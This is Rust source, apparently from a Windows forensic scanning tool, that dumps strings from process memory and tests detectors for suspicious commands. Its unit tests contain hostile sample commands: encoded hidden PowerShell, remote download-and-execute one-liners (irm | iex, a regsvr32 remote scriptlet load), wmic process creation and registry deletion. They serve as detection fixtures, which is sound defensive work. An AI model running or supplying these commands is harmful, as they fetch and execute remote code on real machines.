// Windows process memory scanning, dump extraction, and process-level custom matching.

#[cfg(not(windows))]
fn scan_accessible_processes(
    _output_dir: &Path,
    _matcher: Option<&CustomMatcher>,
    _process_filter: Option<&ProcessSelection>,
    _hits_by_file: &mut BTreeMap<String, Vec<CustomHit>>,
    _fast_needle_matcher: &FastNeedleMatcher,
) -> io::Result<ProcessScanReport> {
    Ok(ProcessScanReport::default())
}

#[cfg(windows)]
fn scan_accessible_processes(
    output_dir: &Path,
    matcher: Option<&CustomMatcher>,
    process_filter: Option<&ProcessSelection>,
    hits_by_file: &mut BTreeMap<String, Vec<CustomHit>>,
    fast_needle_matcher: &FastNeedleMatcher,
) -> io::Result<ProcessScanReport> {
    fs::create_dir_all(output_dir)?;
    let mut jobs = collect_process_scan_jobs()?;
    if let Some(filter) = process_filter {
        jobs.retain(|job| process_job_matches_filter(job, filter));
    }
    if jobs.is_empty() {
        return Ok(ProcessScanReport::default());
    }

    let worker_count = choose_process_scan_workers(jobs.len(), matcher.is_some());
    let limits = choose_process_scan_limits(matcher.is_some());
    log_info(&format!(
        "{}: {} | {}: {}",
        tr_ui("Потоки Memory scan", "Memory scan workers"),
        worker_count,
        tr_ui("Процессов в очереди", "Processes queued"),
        jobs.len()
    ));
    if limits.max_bytes_per_process != usize::MAX {
        log_info(&format!(
            "{}: {} MB | {}: {} MB | {}: {}s",
            tr_ui("Лимит на процесс", "Per-process cap"),
            limits.max_bytes_per_process / (1024 * 1024),
            tr_ui("Лимит региона", "Region cap"),
            limits.max_region_bytes / (1024 * 1024),
            tr_ui("Таймаут процесса", "Per-process timeout"),
            limits.timeout.as_secs()
        ));
    } else {
        log_info(tr_ui(
            "Режим полного скана процессов (RSS_ANALYS_PROCESS_SCAN_FULL=1)",
            "Full process scan mode (RSS_ANALYS_PROCESS_SCAN_FULL=1)",
        ));
    }

    let cursor = AtomicUsize::new(0);
    let batches = thread::scope(|scope| {
        let mut handles = Vec::with_capacity(worker_count);
        for _ in 0..worker_count {
            handles.push(scope.spawn(|| {
                process_scan_worker(
                    &jobs,
                    output_dir,
                    matcher,
                    &cursor,
                    fast_needle_matcher,
                    limits,
                )
            }));
        }

        let mut out = Vec::with_capacity(handles.len());
        for handle in handles {
            let batch = handle
                .join()
                .map_err(|_| io::Error::other("process scan worker panicked"))?;
            out.push(batch);
        }
        Ok::<Vec<ProcessWorkerBatch>, io::Error>(out)
    })?;

    let mut report = ProcessScanReport::default();
    for batch in batches {
        report.process_scanned += batch.report.process_scanned;
        report.process_skipped += batch.report.process_skipped;
        report.process_dumps += batch.report.process_dumps;
        report
            .dump_files
            .extend(batch.report.dump_files.into_iter());
        merge_analyzer(&mut report.process_analyzer, batch.process_analyzer);
        for (path, hits) in batch.hits {
            hits_by_file.insert(path, hits);
        }
    }

    Ok(report)
}

#[cfg(windows)]
#[derive(Clone)]
struct ProcessScanJob {
    pid: u32,
    process_name: String,
}

#[cfg(windows)]
#[derive(Default)]
struct ProcessWorkerBatch {
    report: ProcessScanReport,
    hits: Vec<(String, Vec<CustomHit>)>,
    process_analyzer: Analyzer,
}

#[cfg(windows)]
fn collect_process_scan_jobs() -> io::Result<Vec<ProcessScanJob>> {
    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) }
        .map_err(|e| io::Error::other(format!("process snapshot: {e}")))?;
    if snapshot.is_invalid() {
        return Ok(Vec::new());
    }

    let mut jobs = Vec::new();
    let mut entry = PROCESSENTRY32W {
        dwSize: size_of::<PROCESSENTRY32W>() as u32,
        ..Default::default()
    };
    let mut ok = unsafe { Process32FirstW(snapshot, &mut entry).is_ok() };
    while ok {
        let pid = entry.th32ProcessID;
        if pid > 0 {
            jobs.push(ProcessScanJob {
                pid,
                process_name: utf16z_to_string(&entry.szExeFile),
            });
        }
        ok = unsafe { Process32NextW(snapshot, &mut entry).is_ok() };
    }
    unsafe {
        let _ = CloseHandle(snapshot);
    }
    Ok(jobs)
}

#[cfg(windows)]
fn choose_process_scan_workers(process_count: usize, custom_mode: bool) -> usize {
    let cpu = available_cpu_threads();
    let cpu_budget = cpu_worker_budget_45_from_cpu(cpu);
    let workers = if custom_mode {
        cpu.clamp(4, 16)
    } else {
        cpu.clamp(2, 12)
    };
    workers.min(cpu_budget).min(process_count.max(1)).max(1)
}

#[cfg(windows)]
#[derive(Clone, Copy)]
struct ProcessScanLimits {
    max_bytes_per_process: usize,
    max_region_bytes: usize,
    timeout: Duration,
}

#[cfg(windows)]
fn choose_process_scan_limits(custom_mode: bool) -> ProcessScanLimits {
    let full_mode = env_flag_true("RSS_ANALYS_PROCESS_SCAN_FULL");
    if full_mode {
        return ProcessScanLimits {
            max_bytes_per_process: usize::MAX,
            max_region_bytes: usize::MAX,
            timeout: Duration::from_secs(600),
        };
    }

    let default_max_mb = if custom_mode {
        PROCESS_SCAN_CUSTOM_MAX_MB
    } else {
        PROCESS_SCAN_DEFAULT_MAX_MB
    };
    let default_region_mb = if custom_mode {
        PROCESS_SCAN_CUSTOM_REGION_MAX_MB
    } else {
        PROCESS_SCAN_DEFAULT_REGION_MAX_MB
    };
    let default_timeout_secs = if custom_mode {
        PROCESS_SCAN_CUSTOM_TIMEOUT_SECS
    } else {
        PROCESS_SCAN_DEFAULT_TIMEOUT_SECS
    };

    let max_mb = env_usize_or("RSS_ANALYS_PROCESS_MAX_MB", default_max_mb).max(32);
    let region_mb = env_usize_or("RSS_ANALYS_PROCESS_REGION_MAX_MB", default_region_mb).max(4);
    let timeout_secs = env_u64_or("RSS_ANALYS_PROCESS_TIMEOUT_SECS", default_timeout_secs).max(10);

    ProcessScanLimits {
        max_bytes_per_process: max_mb.saturating_mul(1024 * 1024),
        max_region_bytes: region_mb.saturating_mul(1024 * 1024),
        timeout: Duration::from_secs(timeout_secs),
    }
}

fn env_flag_true(name: &str) -> bool {
    matches!(
        env::var(name)
            .ok()
            .as_deref()
            .map(str::trim)
            .map(str::to_ascii_lowercase)
            .as_deref(),
        Some("1") | Some("true") | Some("yes") | Some("on")
    )
}

fn env_usize_or(name: &str, default: usize) -> usize {
    env::var(name)
        .ok()
        .and_then(|v| v.trim().parse::<usize>().ok())
        .unwrap_or(default)
}

fn env_u64_or(name: &str, default: u64) -> u64 {
    env::var(name)
        .ok()
        .and_then(|v| v.trim().parse::<u64>().ok())
        .unwrap_or(default)
}

#[cfg(windows)]
fn process_scan_worker(
    jobs: &[ProcessScanJob],
    output_dir: &Path,
    matcher: Option<&CustomMatcher>,
    cursor: &AtomicUsize,
    fast_needle_matcher: &FastNeedleMatcher,
    limits: ProcessScanLimits,
) -> ProcessWorkerBatch {
    let mut batch = ProcessWorkerBatch::default();
    loop {
        let idx = cursor.fetch_add(1, Ordering::Relaxed);
        if idx >= jobs.len() {
            break;
        }

        let job = &jobs[idx];
        match open_process_for_scan(job.pid) {
            Ok(handle) => {
                batch.report.process_scanned += 1;
                let file_name = format!(
                    "{} [{}].txt",
                    sanitize_file_component(&job.process_name),
                    job.pid
                );
                let output_file = output_dir.join(file_name);
                match scan_process_memory_to_file(
                    handle,
                    &output_file,
                    matcher,
                    &job.process_name,
                    fast_needle_matcher,
                    limits,
                ) {
                    Ok(result) => {
                        batch.report.process_dumps += 1;
                        batch.report.dump_files.push(output_file.clone());
                        merge_analyzer(&mut batch.process_analyzer, result.analyzer);
                        if !result.hits.is_empty() {
                            batch
                                .hits
                                .push((output_file.display().to_string(), result.hits));
                        }
                    }
                    Err(e) => {
                        eprintln!(
                            "Process scan error {} [{}]: {}",
                            job.process_name, job.pid, e
                        );
                    }
                }
                unsafe {
                    let _ = CloseHandle(handle);
                }
            }
            Err(_) => {
                batch.report.process_skipped += 1;
            }
        }
    }
    batch
}

#[cfg(windows)]
fn open_process_for_scan(pid: u32) -> windows::core::Result<HANDLE> {
    let tries = [
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ,
        PROCESS_VM_READ,
    ];
    for access in tries {
        if let Ok(handle) = unsafe { OpenProcess(access, false, pid) } {
            return Ok(handle);
        }
    }
    unsafe { OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid) }
}

#[cfg(windows)]
fn process_job_matches_filter(job: &ProcessScanJob, filter: &ProcessSelection) -> bool {
    if filter.pids.contains(&job.pid) {
        return true;
    }
    if let Some(name) = normalize_process_match_name(&job.process_name) {
        return filter.names.contains(&name);
    }
    false
}

#[cfg(windows)]
#[derive(Clone, Copy)]
struct ProcessRegion {
    base_address: u64,
    size: usize,
}

#[cfg(windows)]
struct ProcessMemoryScanResult {
    hits: Vec<CustomHit>,
    analyzer: Analyzer,
}

#[cfg(windows)]
struct ProcessDumpFastAnalyzeCtx<'a> {
    analyzer: &'a mut Analyzer,
    fast_needle_matcher: &'a FastNeedleMatcher,
    last_line: &'a mut String,
    assembler: LogicalLineAssembler,
}

#[cfg(windows)]
fn collect_process_regions_limited(handle: HANDLE, max_region_bytes: usize) -> Vec<ProcessRegion> {
    let mut out = Vec::new();
    let mut info = SYSTEM_INFO::default();
    unsafe {
        GetSystemInfo(&mut info);
    }
    let mut current = info.lpMinimumApplicationAddress as usize;
    let max_addr = info.lpMaximumApplicationAddress as usize;

    while current < max_addr {
        let mut mbi = MEMORY_BASIC_INFORMATION::default();
        let res = unsafe {
            VirtualQueryEx(
                handle,
                Some(current as *const _),
                &mut mbi,
                size_of::<MEMORY_BASIC_INFORMATION>(),
            )
        };
        if res == 0 {
            current = current.saturating_add(0x1000);
            continue;
        }

        let region_size = mbi.RegionSize;
        let base = mbi.BaseAddress as usize;
        let next = base.saturating_add(region_size);
        current = next;

        if region_size == 0 || mbi.State != MEM_COMMIT {
            continue;
        }
        let protect = mbi.Protect;
        if protect.0 & PAGE_NOACCESS.0 != 0 || protect.0 & PAGE_GUARD.0 != 0 {
            continue;
        }

        if mbi.Type != MEM_PRIVATE && mbi.Type != MEM_IMAGE && mbi.Type != MEM_MAPPED {
            continue;
        }

        let scan_size = region_size.min(max_region_bytes);
        if scan_size == 0 {
            continue;
        }

        out.push(ProcessRegion {
            base_address: base as u64,
            size: scan_size,
        });
    }
    out
}

#[cfg(windows)]
fn scan_process_memory_to_file(
    handle: HANDLE,
    output_file: &Path,
    matcher: Option<&CustomMatcher>,
    process_name: &str,
    fast_needle_matcher: &FastNeedleMatcher,
    limits: ProcessScanLimits,
) -> io::Result<ProcessMemoryScanResult> {
    let mut writer = BufWriter::with_capacity(IO_STREAM_BUFFER_BYTES, File::create(output_file)?);
    let process_scope = normalize_process_match_name(process_name);
    let mut acc = matcher.and_then(|m| {
        if m.has_rules_for_process(process_scope.as_deref()) {
            Some(CustomAccumulator::new(m, process_scope.as_deref()))
        } else {
            None
        }
    });
    let mut process_analyzer = Analyzer::default();
    let mut last_fast_line = String::new();
    let mut fast_ctx = ProcessDumpFastAnalyzeCtx {
        analyzer: &mut process_analyzer,
        fast_needle_matcher,
        last_line: &mut last_fast_line,
        assembler: LogicalLineAssembler::default(),
    };
    let mut custom_seen = if acc.is_some() {
        let mut set = FxHashSet::default();
        set.reserve(131_072);
        Some(set)
    } else {
        None
    };
    let regions = collect_process_regions_limited(handle, limits.max_region_bytes);
    let mut read_buf = vec![0u8; PROCESS_STRINGS_CHUNK_SIZE];
    let started = Instant::now();
    let mut read_total = 0usize;

    'regions: for region in regions {
        if started.elapsed() >= limits.timeout {
            break;
        }
        let mut offset = 0usize;
        let overlap = PROCESS_STRINGS_OVERLAP.min(PROCESS_STRINGS_CHUNK_SIZE.saturating_sub(1));
        while offset < region.size {
            if started.elapsed() >= limits.timeout {
                break 'regions;
            }
            if read_total >= limits.max_bytes_per_process {
                break 'regions;
            }
            let to_read = min(PROCESS_STRINGS_CHUNK_SIZE, region.size - offset);
            if to_read == 0 {
                break;
            }
            let mut bytes_read = 0usize;
            let read_result = unsafe {
                ReadProcessMemory(
                    handle,
                    (region.base_address + offset as u64) as *const _,
                    read_buf.as_mut_ptr() as *mut _,
                    to_read,
                    Some(&mut bytes_read),
                )
            };
            if read_result.is_err() || bytes_read == 0 {
                offset = offset.saturating_add(to_read.max(0x1000));
                continue;
            }
            read_total = read_total.saturating_add(bytes_read);
            write_strings_from_chunk(
                &read_buf[..bytes_read],
                &mut writer,
                acc.as_mut(),
                custom_seen.as_mut(),
                Some(&mut fast_ctx),
            )?;
            offset = offset.saturating_add(to_read.saturating_sub(overlap).max(1));
        }
    }
    if let Some(tail) = fast_ctx.assembler.finish()
        && let Some(line) =
            relevant_line_for_fast_analysis(&tail, fast_ctx.last_line, fast_ctx.fast_needle_matcher)
    {
        writeln!(writer, "{line}")?;
        fast_ctx.analyzer.analyze_fragment(&line);
        fast_ctx.last_line.clear();
        fast_ctx.last_line.push_str(&line);
    }

    writer.flush()?;
    Ok(ProcessMemoryScanResult {
        hits: acc.map(CustomAccumulator::finish).unwrap_or_default(),
        analyzer: process_analyzer,
    })
}

fn write_strings_from_chunk(
    chunk: &[u8],
    writer: &mut BufWriter<File>,
    acc: Option<&mut CustomAccumulator<'_>>,
    custom_seen: Option<&mut FxHashSet<String>>,
    fast_ctx: Option<&mut ProcessDumpFastAnalyzeCtx<'_>>,
) -> io::Result<()> {
    let mut acc = acc;
    let mut custom_seen = custom_seen;
    let mut fast_ctx = fast_ctx;
    let mut seen = FxHashSet::default();
    seen.reserve(1024);
    let mut custom_batch = String::with_capacity(CUSTOM_FEED_BATCH_BYTES);
    for s in extract_strings_system_informer(chunk, PROCESS_STRINGS_MIN_LEN, false) {
        if s.is_empty() || !seen.insert(s.clone()) {
            continue;
        }
        if let Some(a_ref) = acc.as_deref()
            && a_ref.is_done()
        {
            acc = None;
            custom_seen = None;
            custom_batch.clear();
        }
        if let Some(a) = acc.as_deref_mut() {
            let should_feed = if let Some(global_seen) = custom_seen.as_deref_mut() {
                if global_seen.contains(&s) {
                    false
                } else {
                    global_seen.insert(s.clone());
                    if global_seen.len() > CUSTOM_PROCESS_SEEN_LIMIT {
                        global_seen.clear();
                    }
                    true
                }
            } else {
                true
            };
            if should_feed {
                custom_batch.push_str(&s);
                custom_batch.push('\n');
                if custom_batch.len() >= CUSTOM_FEED_BATCH_BYTES {
                    a.feed_text(&custom_batch);
                    custom_batch.clear();
                }
            }
        }
        if let Some(ctx) = fast_ctx.as_deref_mut() {
            let (line1, line2) = ctx.assembler.push_fragment(&s);
            if let Some(joined) = line1
                && let Some(line) =
                    relevant_line_for_fast_analysis(&joined, ctx.last_line, ctx.fast_needle_matcher)
            {
                writeln!(writer, "{line}")?;
                ctx.analyzer.analyze_fragment(&line);
                ctx.last_line.clear();
                ctx.last_line.push_str(&line);
            }
            if let Some(joined) = line2
                && let Some(line) =
                    relevant_line_for_fast_analysis(&joined, ctx.last_line, ctx.fast_needle_matcher)
            {
                writeln!(writer, "{line}")?;
                ctx.analyzer.analyze_fragment(&line);
                ctx.last_line.clear();
                ctx.last_line.push_str(&line);
            }
        }
    }
    if let Some(a) = acc.as_deref_mut()
        && !custom_batch.is_empty()
    {
        a.feed_text(&custom_batch);
    }
    Ok(())
}

fn sanitize_scanned_string(value: &str) -> String {
    value
        .chars()
        .filter(|c| *c != '\r' && *c != '\n' && *c != '\0')
        .collect::<String>()
        .trim()
        .to_string()
}

#[cfg(windows)]
fn utf16z_to_string(buf: &[u16]) -> String {
    let end = buf.iter().position(|&c| c == 0).unwrap_or(buf.len());
    String::from_utf16_lossy(&buf[..end])
}

fn sanitize_file_component(name: &str) -> String {
    let fallback = if name.trim().is_empty() {
        "unknown.exe"
    } else {
        name.trim()
    };
    let mut out = String::with_capacity(fallback.len());
    for ch in fallback.chars() {
        if ch.is_control() || ['<', '>', ':', '"', '/', '\\', '|', '?', '*'].contains(&ch) {
            out.push('_');
        } else {
            out.push(ch);
        }
    }
    if out.is_empty() {
        out.push_str("unknown.exe");
    }
    if out.len() > 120 {
        out.truncate(120);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fast_needles(items: &[&str]) -> FastNeedleMatcher {
        let needles = items.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        FastNeedleMatcher::build(&needles)
    }

    #[test]
    fn regkey_delete_command_rule() {
        assert!(is_regdel(
            r#"cmd /c reg delete "HKEY_LOCAL_MACHINE\Software\Bad" /f"#
        ));
        assert!(is_regdel(r#"reg.exe delete HKCU\Software\Bad /f"#));
        assert!(!is_regdel("gregdeletehkeyzzz"));
        assert!(!is_regdel("reg and hkey only"));
    }

    #[test]
    fn replaceclean_rules() {
        assert!(is_replaceclean(r#"cmd /c echo hello>out.txt"#));
        assert!(is_replaceclean("type input.txt > output.txt"));
        assert!(is_replaceclean("copy src.dll /-y dst.dll"));
        assert!(!is_replaceclean("Echo this line"));
        assert!(!is_replaceclean("type this line"));
        assert!(!is_replaceclean("copy onlyone"));
        assert!(!is_replaceclean(
            "RtlStringCchCopyW failed to copy FileName [%x]"
        ));
    }

    #[test]
    fn fileless_rules() {
        assert!(!is_fileless("iex x"));
        assert!(!is_fileless("iwr x"));
        assert!(is_fileless("powershell -EncodedCommand QQ=="));
        assert!(is_fileless(
            "Invoke-Expression iwr http://github.com/pastebin example"
        ));
        assert!(is_fileless(
            "pwsh -nop -w hidden -enc SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsACkA"
        ));
        assert!(!is_fileless(
            "- https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2"
        ));
        assert!(!is_fileless(
            "powershell.exe -encodedCommand $encodedCommand"
        ));
        assert!(!is_fileless("runner.bat download invoke base64 payload"));
        assert!(!is_fileless("no keyword line"));
        assert!(is_fileless("irm https://massgrave.dev/get | iex"));
        assert!(is_fileless(
            r#"Invoke-WebRequest -Uri "https://github.com/didor00/blue-and-blue/raw/main/publicblue.bin" -UseBasicParsing"#,
        ));
        assert!(!is_fileless(
            r#"Invoke-WebRequest -UseBasicParsing -OutFile file.txt"#,
        ));
    }

    #[test]
    fn java_batch_rules() {
        assert!(is_java_batch(r#"cmd /c "C:\Users\user\run.bat""#));
        assert!(is_java_batch("java -jar app.jar"));
        assert!(is_java_batch("java -JAR app2.jar"));
        assert!(!is_java_batch(
            "PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC"
        ));
        assert!(!is_java_batch(
            "XE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC"
        ));
        assert!(!is_java_batch("runner.bat"));
        assert!(!is_java_batch("java -jar   "));
    }

    #[test]
    fn beta_protocol_rules() {
        let line = r#"HKEY_CLASSES_ROOT\test\shell\open\command (Default) REG_SZ "C:\Users\RSS\Downloads\rss.exe" "%1""#;
        let lower = line.to_ascii_lowercase();
        assert!(is_beta_protocol_abuse_lc(line, &lower));

        let line2 = r#"reg add HKCR\test /v "URL Protocol" /t REG_SZ /d "" /f"#;
        let lower2 = line2.to_ascii_lowercase();
        assert!(is_beta_protocol_abuse_lc(line2, &lower2));

        let line3 = r#"test://launch"#;
        let lower3 = line3.to_ascii_lowercase();
        assert!(!is_beta_protocol_abuse_lc(line3, &lower3));
    }

    #[test]
    fn beta_protocol_drops_ui_and_html_noise() {
        let line = r#"qsTr("By clicking '%1', ... <a href='https://www.youtube.com/t/terms'>here</a> ...")"#;
        let lower = line.to_ascii_lowercase();
        assert!(!is_beta_protocol_abuse_lc(line, &lower));
    }

    #[test]
    fn beta_protocol_drops_narrative_instructions() {
        let line = r#"How to create key in Regedit: HKEY_Classes_Root ... Url Protocol ... shell ... open ... command ... "C:\Users\RSS\Downloads\rss" "%1""#;
        let lower = line.to_ascii_lowercase();
        assert!(!is_beta_protocol_abuse_lc(line, &lower));
    }

    #[test]
    fn forfiles_wmic_strict_rule() {
        assert!(is_forfiles_wmic_lc(
            r#"cmd /c wmic    process   call   create "calc.exe""#
        ));
        assert!(!is_forfiles_wmic_lc("wmic product get name"));
        assert!(!is_forfiles_wmic_lc(
            "forfiles /m *.txt /c \"cmd /c echo @path\""
        ));
    }

    #[test]
    fn logical_line_stitcher_wmic_multiline_rule() {
        let mut stitch = LogicalLineAssembler::default();
        let (a1, b1) =
            stitch.push_fragment(r#"wmic  process call create "C:\Users\jumarf\Desktop\"#);
        assert!(a1.is_none());
        assert!(b1.is_none());

        let (a2, b2) = stitch.push_fragment(r#"\JournalTrace (4).qwerty"29\r"#);
        let merged = a2.or(b2).expect("merged line");
        let cleaned = clean_line(&merged).expect("clean line");
        let lower = cleaned.to_ascii_lowercase();

        assert!(is_forfiles_wmic_lc(&lower));
        assert!(cleaned.contains(r#"C:\Users\jumarf\Desktop\JournalTrace (4).qwerty"#));
        assert!(!cleaned.ends_with("29"));
        assert!(!cleaned.ends_with("\\r"));
    }

    #[test]
    fn analyzer_stitches_multiline_commands_in_text() {
        let mut a = Analyzer::default();
        a.analyze_text(
            "wmic  process call create \"C:\\Users\\jumarf\\Desktop\\\n\\JournalTrace (4).qwerty\"29\r\n",
        );
        let joined = a
            .forfiles_wmic
            .iter()
            .find(|line| line.contains("JournalTrace (4).qwerty"))
            .cloned();
        assert!(joined.is_some());
    }

    #[test]
    fn dll_detection_rules() {
        assert!(!is_dll_execution_lc(
            r#"rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl"#,
            &r#"rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl"#.to_ascii_lowercase()
        ));
        assert!(is_dll_execution_lc(
            r#"rundll32.exe C:\Users\test\AppData\Local\Temp\payload.dll,EntryPoint"#,
            &r#"rundll32.exe C:\Users\test\AppData\Local\Temp\payload.dll,EntryPoint"#
                .to_ascii_lowercase()
        ));
        assert!(is_dll_execution_lc(
            r#"regsvr32 /s /u /i:http://x.x/payload.sct scrobj.dll"#,
            &r#"regsvr32 /s /u /i:http://x.x/payload.sct scrobj.dll"#.to_ascii_lowercase()
        ));
        assert!(!is_dll_execution_lc(
            r#"C:\Windows\System32\rundll32.exe"#,
            &r#"C:\Windows\System32\rundll32.exe"#.to_ascii_lowercase()
        ));
        assert!(!is_dll_execution_lc(
            r#"<Task version="1.6" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Actions><Exec><Command>%windir%\system32\rundll32.exe</Command></Exec></Actions></Task>"#,
            &r#"<Task version="1.6" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Actions><Exec><Command>%windir%\system32\rundll32.exe</Command></Exec></Actions></Task>"#.to_ascii_lowercase()
        ));
    }

    #[test]
    fn command_ioc_rules() {
        assert!(is_command_ioc_lc(
            r#"powershell -nop -w hidden -enc SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsACkA"#,
            &r#"powershell -nop -w hidden -enc SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsACkA"#.to_ascii_lowercase()
        ));
        assert!(is_command_ioc_lc(
            r#"cmd /c reg delete HKCU\Software\Bad /f"#,
            &r#"cmd /c reg delete HKCU\Software\Bad /f"#.to_ascii_lowercase()
        ));
        assert!(!is_command_ioc_lc(
            r#""C:\Program Files (x86)\Steam\steamwebhelper.exe" --gaia-url=http://disabled.invalid"#,
            &r#""C:\Program Files (x86)\Steam\steamwebhelper.exe" --gaia-url=http://disabled.invalid"#.to_ascii_lowercase()
        ));
    }

    #[test]
    fn binary_candidate_validation_rules() {
        assert!(is_valid_binary_candidate(
            r"C:\ASCON\ASCON Services\Ascon.AU.Updater.exe"
        ));
        assert!(!is_valid_binary_candidate(r"C:\.exe"));
        assert!(!is_valid_binary_candidate(r"*:\*.freeplanetvpn.com"));
        assert!(!is_valid_binary_candidate(r"C:\* https:\github.com"));
        assert!(!is_valid_binary_candidate(r"?:\pagefile.sys"));
    }

    #[test]
    fn pathless_name_normalization_rules() {
        assert_eq!(normalize_pathless_name("!!steamwebhelper.exe"), None);
        assert_eq!(normalize_pathless_name("!aceclient.exe"), None);
        assert_eq!(
            normalize_pathless_name("[savemin] blue avalone.exe"),
            Some("[savemin] blue avalone.exe".to_string())
        );
        assert_eq!(
            normalize_pathless_name("(1) systeminformer.exe"),
            Some("(1) systeminformer.exe".to_string())
        );
        assert_eq!(
            normalize_pathless_name("steamwebhelper.exe"),
            Some("steamwebhelper.exe".to_string())
        );
        assert_eq!(normalize_pathless_name("*.exe"), None);
        assert_eq!(normalize_pathless_name("*.freeplanetvpn.com"), None);
        assert_eq!(normalize_pathless_name(".exe"), None);
    }

    #[test]
    fn windows_path_normalization_rules() {
        assert_eq!(
            normalize_full_windows_path(r"C:\C:\Windows\System32\svchost.exe"),
            r"C:\Windows\System32\svchost.exe"
        );
        assert_eq!(
            normalize_full_windows_path(r#"c:\users\jumarf\downloads\tool.exe"#),
            r"C:\users\jumarf\downloads\tool.exe"
        );
        assert_eq!(
            normalize_full_windows_path(r#" c : \users\jumarf\downloads\tool.exe "#),
            r"C:\users\jumarf\downloads\tool.exe"
        );
        assert_eq!(
            normalize_full_windows_path("C:\r\\Users\\jumarf\\Downloads\\tool.exe"),
            r"C:\Users\jumarf\Downloads\tool.exe"
        );
        let p1 =
            normalize_full_windows_path(r"C:\Device\HarddiskVolume3\Windows\System32\csrss.exe");
        assert!(
            p1.eq_ignore_ascii_case(r"\Device\HarddiskVolume3\Windows\System32\csrss.exe")
                || p1.eq_ignore_ascii_case(r"C:\Windows\System32\csrss.exe")
        );
        let p2 = normalize_full_windows_path(r"\Device\HarddiskVolume3\Windows\System32\dwm.exe");
        assert!(
            p2.eq_ignore_ascii_case(r"\Device\HarddiskVolume3\Windows\System32\dwm.exe")
                || p2.eq_ignore_ascii_case(r"C:\Windows\System32\dwm.exe")
        );
        let line = normalize_paths_in_text(
            r#"cmd /c "\Device\HarddiskVolume3\Users\jumarf\test\run.bat""#,
        );
        assert!(
            !line
                .to_ascii_lowercase()
                .contains(r"\device\harddiskvolume3\users\jumarf\test\run.bat")
        );
        assert!(is_abs_win(r#" c : \users\jumarf\downloads\tool.exe "#));
        assert!(is_abs_win(r#"c:\users\jumarf\downloads\tool.exe"#));
    }

    #[test]
    fn bracketed_and_parenthesized_paths_are_extracted() {
        let sample = r#"c:\users\jumarf\pictures\mamyt_raxal_sbin_blyadki_softers=yeban\[savemin] blue avalone.exe"#;
        let found = extract_binary_candidates(sample);
        assert!(
            found.iter().any(|x| x
                .to_ascii_lowercase()
                .contains(r"c:\users\jumarf\pictures\mamyt_raxal_sbin_blyadki_softers=yeban\[savemin] blue avalone.exe"))
        );
        let normalized = norm_file_candidate(sample).unwrap_or_default();
        assert!(normalized.eq_ignore_ascii_case(
            r"C:\users\jumarf\pictures\mamyt_raxal_sbin_blyadki_softers=yeban\[savemin] blue avalone.exe"
        ));

        let sample2 = r#"c:\users\jumarf\downloads\systeminformer-3.2.25011-release-setup (1).exe"#;
        let norm2 = norm_file_candidate(sample2).unwrap_or_default();
        assert!(norm2.eq_ignore_ascii_case(
            r"C:\users\jumarf\downloads\systeminformer-3.2.25011-release-setup (1).exe"
        ));
    }

    #[test]
    fn analyzer_keeps_useful_paths_even_with_noise_phrase() {
        let mut a = Analyzer::default();
        let line = r#"rtlstringcchcopyw failed to copy filename C:\users\jumarf\pictures\mamyt_raxal_sbin_blyadki_softers=yeban\[savemin] blue avalone.exe"#;
        a.analyze_fragment(line);
        assert!(a.full_paths.iter().any(|x| x.eq_ignore_ascii_case(
            r"C:\users\jumarf\pictures\mamyt_raxal_sbin_blyadki_softers=yeban\[savemin] blue avalone.exe"
        )));
    }

    #[test]
    fn prefixed_and_split_paths_are_detected() {
        let mut a = Analyzer::default();
        a.analyze_fragment(
            r#"jC:\Users\jumarf\Desktop\dumper\target\release\dump_and_network\dump_and_network.exem"#,
        );
        assert!(a.full_paths.iter().any(|x| x.eq_ignore_ascii_case(
            r"C:\Users\jumarf\Desktop\dumper\target\release\dump_and_network\dump_and_network.exe"
        )));

        let split = "%C:\\Users\\jumarf\\Desktop\\1487\n\t\\target\\release\\winrar_viewer.exe";
        a.analyze_fragment(split);
        assert!(a.full_paths.iter().any(|x| x.eq_ignore_ascii_case(
            r"C:\Users\jumarf\Desktop\1487\target\release\winrar_viewer.exe"
        )));
    }

    #[test]
    fn telegram_friendly_app_name_path_is_not_truncated() {
        let raw = r#"C:\Users\jumarf\Downloads\Telegram Desktop\!\(8)\exe\[SaveMin] Aurora DLC Loader.exe.FriendlyAppName"#;
        let norm = norm_file_candidate(raw).unwrap_or_default();
        assert!(norm.eq_ignore_ascii_case(
            r"C:\Users\jumarf\Downloads\Telegram Desktop\!\(8)\exe\[SaveMin] Aurora DLC Loader.exe"
        ));
    }

    #[test]
    fn nested_url_chain_does_not_create_fake_download_file() {
        let links = BTreeSet::from([
            "https://amd.online/https://amedia.online/https://amedia.online/API.dll".to_string(),
            "https://altushost-swe.dl.sourceforge.net/project/crystaldiskinfo/9.7.0/CrystalDiskInfo9_7_0.zip".to_string(),
        ]);
        let out = collect_download_links(&links);
        assert!(out.iter().any(|x| x.contains("CrystalDiskInfo9_7_0.zip")));
        assert!(!out.iter().any(|x| x.contains("API.dll")));
    }

    #[test]
    fn date_hint_normalization_rejects_invalid_and_parses_dump_style() {
        assert_eq!(
            normalize_time_hint("2026/01/23-18:27:43.138"),
            Some("2026-01-23 18:27:43.138".to_string())
        );
        assert_eq!(
            normalize_time_hint("31.01.2026 07:08:09"),
            Some("2026-01-31 07:08:09".to_string())
        );
        assert_eq!(normalize_time_hint("2026/99/23-18:27:43.138"), None);
        assert_eq!(normalize_time_hint("2105/08/31:17:32:33"), None);
    }

    #[test]
    fn device_path_mapping_rules() {
        let mut map = HashMap::new();
